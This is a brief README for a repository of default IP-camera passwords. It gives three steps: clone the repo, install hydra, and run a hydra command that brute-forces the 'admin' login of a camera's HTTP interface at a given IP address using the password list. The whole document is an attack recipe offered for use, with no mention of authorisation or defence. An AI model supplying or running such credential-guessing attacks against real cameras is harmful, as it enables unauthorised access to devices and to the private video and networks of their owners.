# ipcam-pass
This contains the default password of different types of IP cameras 

# Step 1
$ git clone https://github.com/utrax/ipcam-pass.git
# Step 2
$ sudo apt-get install hydra
# Step 3
$hydra -l admin -P ip-cam-pass.txt http-get://10.240.138.5 -V
